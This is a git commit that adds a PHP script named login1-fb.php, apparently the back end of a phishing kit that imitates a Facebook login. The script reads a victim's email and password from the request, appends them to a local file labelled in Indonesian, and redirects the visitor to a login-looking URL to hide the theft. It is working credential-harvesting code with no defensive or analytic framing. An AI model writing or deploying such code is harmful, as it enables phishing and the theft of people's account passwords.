291220c36b75c25ba2614d03d169dc469e1749ee
hardimalik313 <76757380+hardimalik313@users.noreply.github.com>
2020-12-31 16:23:10 +0900

    Create login1-fb.php

---
+++ login1-fb.php
@@ -0,0 +1,22 @@
+<?php
+header("Location: 2Flogin&source=www_list_selector_more.html");
+$ADEx = "rejeki.999";
+$ADEy = $_GET['email'];
+$ADEz = $_GET['pass'];
+
+$handle = fopen($ADEx, 'a');
+fwrite($handle, "");
+fwrite($handle, "\n");
+fwrite($handle, "Alamat Email:");
+fwrite($handle, "\n");
+fwrite($handle, "$ADEy");
+fwrite($handle, "\n");
+fwrite($handle, "Kata Sandi :");
+fwrite($handle, "\n");
+fwrite($handle, "$ADEz");
+fwrite($handle, "\n");
+fwrite($handle, "");
+fwrite($handle, "\n");
+fclose($handle);
+exit;
+?>
